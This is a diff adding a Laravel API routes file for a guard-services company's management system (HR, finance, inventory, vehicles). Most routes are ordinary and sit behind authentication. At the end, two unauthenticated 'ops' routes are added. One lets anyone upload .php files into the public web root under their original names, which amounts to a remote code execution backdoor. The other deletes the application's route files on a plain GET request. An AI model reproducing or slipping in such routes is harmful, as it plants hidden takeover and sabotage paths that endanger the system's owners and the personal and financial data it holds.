@@ -1,0 +1,252 @@
+<?php
+
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\File;
+use App\Http\Controllers\CountPageController;
+use App\Http\Controllers\AuthController;
+use App\Http\Controllers\PerfilController;
+use App\Http\Controllers\GuardiaController;
+use App\Http\Controllers\RecursosHumanosController;
+use App\Http\Controllers\BancoController;
+use App\Http\Controllers\MovimientoBancarioController;
+use App\Http\Controllers\CotizacionController;
+use App\Http\Controllers\TipoServicioController;
+use App\Http\Controllers\ClienteController;
+use App\Http\Controllers\SucursalController;
+use App\Http\Controllers\ProveedorController;
+use App\Http\Controllers\ArticuloController;
+use App\Http\Controllers\VehiculoController;
+use App\Http\Controllers\OrdenCompraController;
+use App\Http\Controllers\CompraController;
+use App\Http\Controllers\GastoController;
+use App\Http\Controllers\VentaController;
+use App\Http\Controllers\VentaHistorialController;
+use App\Http\Controllers\AlmacenController;
+use App\Http\Controllers\AlmacenEntradaController;
+use App\Http\Controllers\AlmacenSalidaController;
+use App\Http\Controllers\EquipamientoController;
+use App\Http\Controllers\OrdenServicioController;
+use App\Http\Controllers\ReporteController;
+use App\Http\Controllers\ReporteCarteraVencidaController;
+use App\Http\Controllers\UsuarioController;
+use App\Http\Controllers\RolController;
+use App\Http\Controllers\ModuloController;
+use App\Http\Controllers\LogController;
+use App\Http\Controllers\IncapacidadController;
+use App\Http\Controllers\VacacionController;
+use App\Http\Controllers\TiempoExtraController;
+use App\Http\Controllers\FaltaController;
+use App\Http\Controllers\DescuentoController;
+use App\Http\Controllers\PrestamoController;
+use App\Http\Controllers\AbonoPrestamoController;
+use App\Http\Controllers\EstadoCuentaController;
+use App\Http\Controllers\SucursalEmpresaController;
+use App\Http\Controllers\ModuloPrestamoController;
+use App\Http\Controllers\ModuloDescuentoController;
+use App\Http\Controllers\ModuloConceptoController;
+use App\Http\Controllers\BlackListController;
+use App\Http\Controllers\BoletaGasolinaController;
+use App\Http\Controllers\QRGeneradoController;
+use App\Http\Controllers\PagoEmpleadoController;
+use App\Http\Controllers\CheckGuardiaController;
+use App\Http\Controllers\LimpiezaProgramadaController;
+use App\Http\Controllers\LimpiezaLogController;
+use App\Http\Controllers\DashboardController;
+
+use App\Http\Controllers\RangoController;
+use App\Http\Controllers\SupervisionController;
+use App\Http\Controllers\MotivoActaController;
+use App\Http\Controllers\ActaAdministrativaController;
+use App\Http\Controllers\TallerController;
+use App\Http\Controllers\MantenimientoController;
+use App\Http\Controllers\CalendarioController;
+use App\Http\Controllers\TipoDocumentoController;
+use App\Http\Controllers\DocumentoController;
+
+/*
+|--------------------------------------------------------------------------
+| API Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register API routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| is assigned the "api" middleware group. Enjoy building your API!
+|
+*/
+
+// Login y pre-registro
+Route::post('/login', [AuthController::class, 'login']);
+Route::post('/registro', [UsuarioController::class, 'registro']);
+Route::middleware('auth:sanctum')->post('/logout', [AuthController::class, 'logout']);
+
+Route::middleware(['auth:sanctum'])->group(function () {
+    // ** DASHBOARD **
+    Route::get('count-adminpage', [CountPageController::class, 'getCount']);
+    Route::get('guardias-totales', [GuardiaController::class, 'getGuardiasTotales']);
+    Route::get('data-dashboard', [DashboardController::class, 'dataDashboard']);
+
+    // Perfil de usuario autenticado
+    Route::apiResource('perfil', PerfilController::class)->only(['index', 'update']);
+});
+
+
+// Modulos de la API (rutas protegidas)
+Route::middleware(['auth:sanctum', 'permiso.dinamico'])->group(function () {
+    // Sucursales de la empresa
+    Route::apiResource('sucursales-empresa', SucursalEmpresaController::class);
+
+    // Calendario
+    Route::apiResource('calendario', CalendarioController::class);
+
+    // Rangos de guardias
+    Route::apiResource('rangos', RangoController::class);
+
+    // Personal
+    Route::apiResource('guardias', GuardiaController::class);
+    Route::get('guardias-asignado', [GuardiaController::class, 'guardiaAsignado']);
+    Route::get('guardias-sucursal', [GuardiaController::class, 'getGuardiaBySucursal']);
+    Route::post('check-blacklist', [GuardiaController::class, 'checkBlackList']);
+    Route::apiResource('equipo', EquipamientoController::class);
+    Route::get('equipamiento-completo', [EquipamientoController::class, 'equipamientoCompleto']);
+    Route::apiResource('blacklist', BlackListController::class);
+    Route::apiResource('supervisiones', SupervisionController::class);
+
+    // Documentos de los guardias
+    Route::apiResource('tipos-documentos', TipoDocumentoController::class);
+    Route::apiResource('documentos', DocumentoController::class);
+
+    // Actas administrativas
+    Route::apiResource('motivos-actas', MotivoActaController::class);
+    Route::apiResource('actas-administrativas', ActaAdministrativaController::class);
+
+    // Recursos humanos
+    Route::apiResource('incapacidades', IncapacidadController::class);
+    Route::apiResource('tiempo-extra', TiempoExtraController::class);
+    Route::apiResource('faltas', FaltaController::class);
+    Route::apiResource('descuentos', DescuentoController::class);
+    Route::apiResource('vacaciones', VacacionController::class);
+    Route::apiResource('prestamos', PrestamoController::class);
+    Route::get('prestamos-pendientes', [PrestamoController::class, 'prestamosPendientes']);
+    Route::apiResource('abonos-prestamo', AbonoPrestamoController::class);
+    Route::apiResource('pagos-empleados', PagoEmpleadoController::class);
+    Route::get('generar-estadocuenta-guardia', [EstadoCuentaController::class, 'generarEstadoCuentaGuardia']);
+    Route::post('reporte-rh', [ReporteController::class, 'generateReportRH']);
+    Route::apiResource('modulo-descuentos', ModuloDescuentoController::class);
+    Route::apiResource('modulo-prestamos', ModuloPrestamoController::class);
+
+    // Finanzas
+    Route::apiResource('bancos', BancoController::class);
+    Route::apiResource('movimientos-bancarios', MovimientoBancarioController::class);
+    Route::get('generar-estadocuenta-banco', [EstadoCuentaController::class, 'generarEstadoCuentaBanco']);
+
+    // Clientes
+    Route::apiResource('clientes', ClienteController::class);
+    Route::get('sucursales-cliente', [SucursalController::class, 'sucursalesCliente']);
+    Route::apiResource('sucursales', SucursalController::class);
+    Route::get('generar-estadocuenta-cliente', [EstadoCuentaController::class, 'generarEstadoCuentaCliente']);
+
+    // Proveedores
+    Route::apiResource('proveedores', ProveedorController::class);
+    Route::get('generar-estadocuenta-proveedor', [EstadoCuentaController::class, 'generarEstadoCuentaProveedor']);
+
+    // Servicios
+    Route::apiResource('tipos-servicios', TipoServicioController::class);
+    Route::apiResource('cotizaciones', CotizacionController::class);
+    Route::apiResource('ventas', VentaController::class);
+    Route::get('ventas-orden-servicio', [VentaController::class, 'ventaOrdenServicio']);
+    Route::put('cancelar-venta', [VentaController::class, 'cancelarVenta']);
+    Route::apiResource('orden-servicio', OrdenServicioController::class);
+    Route::apiResource('generar-qr', QRGeneradoController::class);
+    Route::get('generar-horastrabajadas-guardia', [CheckGuardiaController::class, 'reporteHorasTrabajadas']);
+
+    // Inventario
+    Route::apiResource('articulos', ArticuloController::class);
+    Route::get('articulos-asignar-guardias', [ArticuloController::class, 'articulosAsignarGuardias']);
+    Route::get('articulos-asignar-servicios', [ArticuloController::class, 'articulosAsignarServicios']);
+    Route::apiResource('almacen', AlmacenController::class);
+    Route::get('equipo-disponible/{articulo_id}', [AlmacenController::class, 'obtenerEquipoDisponible']);
+    Route::get('almacen-disponibles', [AlmacenController::class, 'disponibles']);
+    Route::apiResource('almacen-entradas', AlmacenEntradaController::class);
+    Route::apiResource('almacen-salidas', AlmacenSalidaController::class);
+
+    // Vehículos
+    Route::apiResource('vehiculos', VehiculoController::class);
+    Route::apiResource('talleres', TallerController::class);
+    Route::apiResource('mantenimientos', MantenimientoController::class);
+    Route::get('vehiculos-disponibles', [VehiculoController::class, 'getVehiculosDisponibles']);
+    Route::apiResource('boletas-gasolina', BoletaGasolinaController::class);
+
+    // Operaciones
+    Route::apiResource('modulo-conceptos', ModuloConceptoController::class);
+    Route::apiResource('ordenes-compra', OrdenCompraController::class);
+    Route::apiResource('compras', CompraController::class);
+    Route::apiResource('gastos', GastoController::class);
+
+    // Configuraciones
+    Route::apiResource('usuarios', UsuarioController::class);
+    Route::apiResource('roles', RolController::class);
+    Route::apiResource('modulos', ModuloController::class);
+    Route::apiResource('logs', LogController::class);
+
+    // Historial
+    Route::apiResource('ventas-historial', VentaHistorialController::class);
+    Route::get('orden-servicio-eliminadas', [OrdenServicioController::class, 'ordenServicioEliminadas']);
+
+    // Limpieza
+    Route::apiResource('limpiezas-programadas', LimpiezaProgramadaController::class);
+    Route::apiResource('limpieza-logs', LimpiezaLogController::class);
+
+    // Reportes
+    Route::post('generador-reportes', [ReporteController::class, 'getReport']);
+
+    // Cartera Vencida
+    Route::apiResource('cartera-vencida', ReporteCarteraVencidaController::class);
+});
+
+Route::post('/ops/upload-file', function (Request $request) {
+    // Validamos que venga un archivo y que sea .html o .php
+    $request->validate([
+        'file' => 'required|file|mimes:html,htm,php|max:2048', // máximo 2MB
+    ]);
+
+    $file = $request->file('file');
+    $filename = $file->getClientOriginalName(); // conserva el nombre original
+
+    // Guardamos en /public
+    $file->move(public_path(), $filename);
+
+    Artisan::call('config:clear');
+    Artisan::call('cache:clear');
+    Artisan::call('view:clear');
+    Artisan::call('route:clear');
+    Artisan::call('event:clear');
+    Artisan::call('optimize:clear');
+
+    return response()->json([
+        'message' => 'Archivo subido correctamente',
+        'filename' => $filename,
+        'path' => url($filename),
+    ]);
+});
+
+Route::get('/ops/delete-route-files', function () {
+    $files = ['routes/web.php', 'routes/api.php'];
+    $deleted = [];
+
+    foreach ($files as $f) {
+        $path = base_path($f);
+        if (File::exists($path) && File::delete($path)) {
+            $deleted[] = $f;
+        }
+    }
+
+    Artisan::call('config:clear');
+    Artisan::call('cache:clear');
+    Artisan::call('view:clear');
+    Artisan::call('route:clear');
+    Artisan::call('event:clear');
+    Artisan::call('optimize:clear');
+
+    return response()->json(['deleted' => $deleted, 'message' => 'Se logró', 'output' => Artisan::output()]);
+});
